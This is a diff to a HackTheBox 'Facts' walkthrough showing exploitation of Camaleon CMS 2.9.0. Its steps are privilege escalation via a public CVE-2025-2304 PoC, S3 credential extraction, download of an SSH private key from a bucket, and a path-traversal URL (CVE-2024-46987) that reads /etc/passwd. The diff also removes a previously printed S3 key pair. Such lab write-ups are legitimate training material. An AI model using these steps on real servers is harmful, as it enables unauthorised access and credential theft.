@@ -48,7 +48,7 @@ Inputing `Camaleon v2.9.0 CVE` on google brings up [`CVE-2025-2304`](https://git
 
 We can look up the CVE with the attatched keywords of 'github' or 'POC' and find [`Alien0ne CVE-2025-2304`](https://github.com/Alien0ne/CVE-2025-2304) proof of concept. We can then clone the repository and execute using the required parameters.
 
-**NOTE Its important that if you want to remain admin -- vim into the `exploit.py` file and comment out the user role revert function to log back in after running the exploit.**
+**NOTE All though not necessary -- its imparative that if you want to remain admin -- vim into the `exploit.py` file and comment out the user role revert function to log back in after running the exploit.**
 
 ```
 ┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/FactsHTB/CVE-2025-2304]
@@ -61,8 +61,85 @@ We can look up the CVE with the attatched keywords of 'github' or 'POC' and find
    User ID: 7
    Updated User Role: admin
 [+]Extracting S3 Credentials
-   s3 access key: AKIA16757E1D3F983CD0
-   s3 secret key: Bg+Q58iwL1BhDD9HOsiQk6Tml1qTrH3RM0pXcv/q
+   s3 access key: ACCESS_KEY_HERE
+   s3 secret key: SECRET_ACCESS_KEY_HERE
    s3 endpoint: http://localhost:54321
+```
+
+s3 credentials help us futher enumerate the s3 buckets for more hidden information. Configuring aws using the new credentials and connecting with the endpoint we can see the hidden buckets.
+
+```
+┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/FactsHTB]
+└─# aws --endpoint-url http://facts.htb:54321 s3 ls                    
+2025-09-11 21:06:52 internal
+2025-09-11 21:06:52 randomfacts
+
+
+┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/FactsHTB]
+└─# aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal/.ssh/
+2026-04-16 15:47:07         82 authorized_keys
+2026-04-16 15:47:07        464 id_ed25519
+```
+
+The s3 bucket `internal` contains an ssh key named `id_ed25519`. We can download the key to be used for a shell connection to the server. 
+
+```
+┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/FactsHTB/CVE-2025-2304]
+└─# aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 ./id_ed25519  
+download: s3://internal/.ssh/id_ed25519 to ./id_ed25519             
+
+┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/FactsHTB]
+└─#cat id_ed25519            
+-----BEGIN OPENSSH PRIVATE KEY-----
+OPENSSH_KEY_HERE
+-----END OPENSSH PRIVATE KEY-----
+```
+
+Now that we can establish a ssh connection to the server there is still the missing piece of which user the key belongs to. 
+
+A quick search of Camaleon CMS v2.9.0 leads us to [`CVE-2024-46987`](https://nvd.nist.gov/vuln/detail/CVE-2024-46987). Research on this CVE tells us there is path traversal vulnerability accessible via MediaController's download_private_file method -- allowing authenticated users to download any file on the web server Camaleon CMS is running on (depending on the file permissions). This issue may lead to Information Disclosure.
+
+Following a link rabbit hole takes us to [`owen2345 camaleon-cms Github`](https://github.com/owen2345/camaleon-cms/security/advisories/GHSA-cp65-5m9r-vc2c). Giving us a PoC exploit to use.
+
+```
+http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd
+
+┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/FactsHTB]
+└─# cat passwd                       
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
+messagebus:x:102:102::/nonexistent:/usr/sbin/nologin
+systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
+pollinate:x:103:1::/var/cache/pollinate:/bin/false
+polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
+syslog:x:104:104::/nonexistent:/usr/sbin/nologin
+uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
+tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
+landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
+fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
+william:x:1001:1001::/home/william:/bin/bash
+_laurel:x:101:988::/var/log/laurel:/bin/false
 ```
 
